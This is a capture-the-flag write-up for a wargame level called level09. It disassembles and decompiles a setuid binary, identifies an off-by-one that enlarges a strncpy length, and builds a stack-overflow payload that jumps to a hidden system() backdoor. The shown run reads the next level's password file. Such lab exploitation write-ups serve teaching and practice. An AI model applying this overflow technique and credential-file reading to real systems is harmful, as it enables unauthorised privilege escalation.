What do we have?

	$ ll
	total 25
	dr-xr-x---+ 1 level09 level09    80 Oct  2  2016 ./
	dr-x--x--x  1 root    root      260 Oct  2  2016 ../
	-rw-r--r--  1 level09 level09   220 Oct  2  2016 .bash_logout
	lrwxrwxrwx  1 root    root        7 Oct  2  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level09 level09  3534 Oct  2  2016 .bashrc
	-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09*
	-rw-r--r--+ 1 level09 level09    41 Oct 19  2016 .pass
	-rw-r--r--  1 level09 level09   675 Oct  2  2016 .profile


A `level09` binary. Let's check the assembly:

	$ gdb ./level09
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x0000555555554aa8 <+0>:     push   %rbp
	0x0000555555554aa9 <+1>:     mov    %rsp,%rbp
	=> 0x0000555555554aac <+4>:     lea    0x15d(%rip),%rdi        # 0x555555554c10
	0x0000555555554ab3 <+11>:    callq  0x555555554730 <puts@plt>
	0x0000555555554ab8 <+16>:    callq  0x5555555548c0 <handle_msg>
	0x0000555555554abd <+21>:    mov    $0x0,%eax
	0x0000555555554ac2 <+26>:    pop    %rbp
	0x0000555555554ac3 <+27>:    retq
	End of assembler dump.

	(gdb) info functions
	[...]
	0x000055555555488c  secret_backdoor
	0x00005555555548c0  handle_msg
	0x0000555555554932  set_msg
	0x00005555555549cd  set_username
	0x0000555555554aa8  main

	(gdb) disas secret_backdoor
	Dump of assembler code for function secret_backdoor:
	0x000000000000088c <+0>:     push   %rbp
	0x000000000000088d <+1>:     mov    %rsp,%rbp
	0x0000000000000890 <+4>:     add    $0xffffffffffffff80,%rsp
	0x0000000000000894 <+8>:     mov    0x20171d(%rip),%rax        # 0x201fb8
	0x000000000000089b <+15>:    mov    (%rax),%rax
	0x000000000000089e <+18>:    mov    %rax,%rdx
	0x00000000000008a1 <+21>:    lea    -0x80(%rbp),%rax
	0x00000000000008a5 <+25>:    mov    $0x80,%esi
	0x00000000000008aa <+30>:    mov    %rax,%rdi
	0x00000000000008ad <+33>:    callq  0x770 <fgets@plt>
	0x00000000000008b2 <+38>:    lea    -0x80(%rbp),%rax
	0x00000000000008b6 <+42>:    mov    %rax,%rdi
	0x00000000000008b9 <+45>:    callq  0x740 <system@plt>
	0x00000000000008be <+50>:    leaveq
	0x00000000000008bf <+51>:    retq
	End of assembler dump.
	
	(gdb) disas handle_msg
	Dump of assembler code for function handle_msg:
	0x00000000000008c0 <+0>:     push   %rbp
	0x00000000000008c1 <+1>:     mov    %rsp,%rbp
	0x00000000000008c4 <+4>:     sub    $0xc0,%rsp
	0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax
	0x00000000000008d2 <+18>:    add    $0x8c,%rax
	0x00000000000008d8 <+24>:    movq   $0x0,(%rax)
	0x00000000000008df <+31>:    movq   $0x0,0x8(%rax)
	0x00000000000008e7 <+39>:    movq   $0x0,0x10(%rax)
	0x00000000000008ef <+47>:    movq   $0x0,0x18(%rax)
	0x00000000000008f7 <+55>:    movq   $0x0,0x20(%rax)
	0x00000000000008ff <+63>:    movl   $0x8c,-0xc(%rbp)
	0x0000000000000906 <+70>:    lea    -0xc0(%rbp),%rax
	0x000000000000090d <+77>:    mov    %rax,%rdi
	0x0000000000000910 <+80>:    callq  0x9cd <set_username>
	0x0000000000000915 <+85>:    lea    -0xc0(%rbp),%rax
	0x000000000000091c <+92>:    mov    %rax,%rdi
	0x000000000000091f <+95>:    callq  0x932 <set_msg>
	0x0000000000000924 <+100>:   lea    0x295(%rip),%rdi        # 0xbc0
	0x000000000000092b <+107>:   callq  0x730 <puts@plt>
	0x0000000000000930 <+112>:   leaveq
	0x0000000000000931 <+113>:   retq
	End of assembler dump.

	(gdb) disas set_msg
	Dump of assembler code for function set_msg:
	0x0000000000000932 <+0>:     push   %rbp
	0x0000000000000933 <+1>:     mov    %rsp,%rbp
	0x0000000000000936 <+4>:     sub    $0x410,%rsp
	0x000000000000093d <+11>:    mov    %rdi,-0x408(%rbp)
	0x0000000000000944 <+18>:    lea    -0x400(%rbp),%rax
	0x000000000000094b <+25>:    mov    %rax,%rsi
	0x000000000000094e <+28>:    mov    $0x0,%eax
	0x0000000000000953 <+33>:    mov    $0x80,%edx
	0x0000000000000958 <+38>:    mov    %rsi,%rdi
	0x000000000000095b <+41>:    mov    %rdx,%rcx
	0x000000000000095e <+44>:    rep stos %rax,%es:(%rdi)
	0x0000000000000961 <+47>:    lea    0x265(%rip),%rdi        # 0xbcd
	0x0000000000000968 <+54>:    callq  0x730 <puts@plt>
	0x000000000000096d <+59>:    lea    0x26b(%rip),%rax        # 0xbdf
	0x0000000000000974 <+66>:    mov    %rax,%rdi
	0x0000000000000977 <+69>:    mov    $0x0,%eax
	0x000000000000097c <+74>:    callq  0x750 <printf@plt>
	0x0000000000000981 <+79>:    mov    0x201630(%rip),%rax        # 0x201fb8
	0x0000000000000988 <+86>:    mov    (%rax),%rax
	0x000000000000098b <+89>:    mov    %rax,%rdx
	0x000000000000098e <+92>:    lea    -0x400(%rbp),%rax
	0x0000000000000995 <+99>:    mov    $0x400,%esi
	0x000000000000099a <+104>:   mov    %rax,%rdi
	0x000000000000099d <+107>:   callq  0x770 <fgets@plt>
	0x00000000000009a2 <+112>:   mov    -0x408(%rbp),%rax
	0x00000000000009a9 <+119>:   mov    0xb4(%rax),%eax
	0x00000000000009af <+125>:   movslq %eax,%rdx
	0x00000000000009b2 <+128>:   lea    -0x400(%rbp),%rcx
	0x00000000000009b9 <+135>:   mov    -0x408(%rbp),%rax
	0x00000000000009c0 <+142>:   mov    %rcx,%rsi
	0x00000000000009c3 <+145>:   mov    %rax,%rdi
	0x00000000000009c6 <+148>:   callq  0x720 <strncpy@plt>
	0x00000000000009cb <+153>:   leaveq
	0x00000000000009cc <+154>:   retq
	End of assembler dump.

	(gdb) disas set_username
	Dump of assembler code for function set_username:
	0x00000000000009cd <+0>:     push   %rbp
	0x00000000000009ce <+1>:     mov    %rsp,%rbp
	0x00000000000009d1 <+4>:     sub    $0xa0,%rsp
	0x00000000000009d8 <+11>:    mov    %rdi,-0x98(%rbp)
	0x00000000000009df <+18>:    lea    -0x90(%rbp),%rax
	0x00000000000009e6 <+25>:    mov    %rax,%rsi
	0x00000000000009e9 <+28>:    mov    $0x0,%eax
	0x00000000000009ee <+33>:    mov    $0x10,%edx
	0x00000000000009f3 <+38>:    mov    %rsi,%rdi
	0x00000000000009f6 <+41>:    mov    %rdx,%rcx
	0x00000000000009f9 <+44>:    rep stos %rax,%es:(%rdi)
	0x00000000000009fc <+47>:    lea    0x1e1(%rip),%rdi        # 0xbe4
	0x0000000000000a03 <+54>:    callq  0x730 <puts@plt>
	0x0000000000000a08 <+59>:    lea    0x1d0(%rip),%rax        # 0xbdf
	0x0000000000000a0f <+66>:    mov    %rax,%rdi
	0x0000000000000a12 <+69>:    mov    $0x0,%eax
	0x0000000000000a17 <+74>:    callq  0x750 <printf@plt>
	0x0000000000000a1c <+79>:    mov    0x201595(%rip),%rax        # 0x201fb8
	0x0000000000000a23 <+86>:    mov    (%rax),%rax
	0x0000000000000a26 <+89>:    mov    %rax,%rdx
	0x0000000000000a29 <+92>:    lea    -0x90(%rbp),%rax
	0x0000000000000a30 <+99>:    mov    $0x80,%esi
	0x0000000000000a35 <+104>:   mov    %rax,%rdi
	0x0000000000000a38 <+107>:   callq  0x770 <fgets@plt>
	0x0000000000000a3d <+112>:   movl   $0x0,-0x4(%rbp)
	0x0000000000000a44 <+119>:   jmp    0xa6a <set_username+157>
	0x0000000000000a46 <+121>:   mov    -0x4(%rbp),%eax
	0x0000000000000a49 <+124>:   cltq
	0x0000000000000a4b <+126>:   movzbl -0x90(%rbp,%rax,1),%ecx
	0x0000000000000a53 <+134>:   mov    -0x98(%rbp),%rdx
	0x0000000000000a5a <+141>:   mov    -0x4(%rbp),%eax
	0x0000000000000a5d <+144>:   cltq
	0x0000000000000a5f <+146>:  

Cleaned `Ghidra`:

	void secret_backdoor(void)
	{
		char	local_88[128];

		fgets(local_88, 128, stdin);
		system(local_88);
		return;
	}

A function that let us run any command.

	void	set_username(long param_1)
	{
		long	lVar1;
		char	*pcVar2;
		char	local_98[140];
		int		local_c;
		
		pcVar2 = local_98;
		for (lVar1 = 16; lVar1 != 0; lVar1--)
		{
			pcVar2[0] = '\0';
			pcVar2[1] = '\0';
			pcVar2[2] = '\0';
			pcVar2[3] = '\0';
			pcVar2[4] = '\0';
			pcVar2[5] = '\0';
			pcVar2[6] = '\0';
			pcVar2[7] = '\0';
			pcVar2 += 8;
		}
		puts(">: Enter your username");
		printf(">>: ");
		fgets(local_98, 128, stdin);
		for (local_c = 0; (local_c < 41 && (local_98[local_c] != '\0')); local_c++)
		{
			*(char *)(param_1 + 140 + (long)local_c) = local_98[local_c];
		}
		printf(">: Welcome, %s", param_1 + 140);
		return;
	}

Read our input for an username with `fgets`, and copy at most 41 bytes in a range after the parameter.

	void	set_msg(char *param_1)
	{
		long	lVar1;
		char	*pcVar2;
		char	local_408[1024];
		
		pcVar2 = local_408;
		for (lVar1 = 128; lVar1 != 0; lVar1--)
		{
			pcVar2[0] = '\0';
			pcVar2[1] = '\0';
			pcVar2[2] = '\0';
			pcVar2[3] = '\0';
			pcVar2[4] = '\0';
			pcVar2[5] = '\0';
			pcVar2[6] = '\0';
			pcVar2[7] = '\0';
			pcVar2 += 8;
		}
		puts(">: Msg @Unix-Dude");
		printf(">>: ");
		fgets(local_408, 1024, stdin);
		strncpy(param_1, local_408, (long)*(int *)(param_1 + 180));
		return;
	}

Read our input for a message with `fgets`, and copy it into our parameter. The length is taken from 180 bytes after our parameter.

	void	handle_msg(void)
	{
		char	local_c8[140];
		char	local_3c[40];
		int		local_14;

		local_14 = 0;
		set_username(local_c8);
		set_msg(local_c8);
		puts(">: Msg sent!");
		return;
	}

Create vars, and call the functions. Looks like it's supposed to be a struct, but was reconstructed as such by `Ghidra` (which also got local_3c as multiple int, but we know from previous function it's a buffer for the username). Shouldn't really matter, it's given as a pointer, anyway.

	int main(void)
	{
		puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
		handle_msg();
		return (0);
	}

Call `handle_msg`.

Well, `secret_backdoor` is not called, so we'll have to rewrite `rip` with its address (`0x000055555555488c` => `\x8c\x48\x55\x55\x55\x55\x00\x00`). The overflow is possible because of the `strncpy` of `set_msg`, which will take `local_14` for its length, so let's overflow onto that int.

The copy loop of `set_username` is ran 41 times, so the last byte will go into the int. Thus, the username will be `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xff`. From there, we had a few troubles with using patterns, as they either were not going far enough, or going too far and corrupting data, causing a crash at the retq of `handle_message`. So, we had to calculate the offset manually:

	(gdb) disas handle_msg
	Dump of assembler code for function handle_msg:
	0x00000000000008c0 <+0>:     push   %rbp
	0x00000000000008c1 <+1>:     mov    %rsp,%rbp
	0x00000000000008c4 <+4>:     sub    $0xc0,%rsp
	0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax

There, the stack starts at `rbp` - `0xc0` (192), and `rbp` (8) was pushed, so there is 200 bytes before `rip`. So, 40 fillers, 1 byte for the int, 200 fillers, and the address of `secret_backdoor`.

	$ (printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xff\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\x8c\x48\x55\x55\x55\x55\x00\x00') > /tmp/e

	$ (cat /tmp/e; cat -) | ./level09
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒>: Msg @Unix-Dude

	>>: >: Msg sent!
	cat /home/users/end/.pass
	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

	$ su end
	Password:
	$ ll
	total 13
	dr-xr-x---+ 1 end  end     80 Sep 13  2016 ./
	dr-x--x--x  1 root root   260 Oct  2  2016 ../
	-rw-r--r--  1 end  end    220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root root     7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 end  end   3489 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 end  users    5 Sep 10  2016 end*
	-rw-r--r--+ 1 end  end     41 Oct 19  2016 .pass
	-rw-r--r--  1 end  end    675 Sep 10  2016 .profile
	$ cat end
	GG !
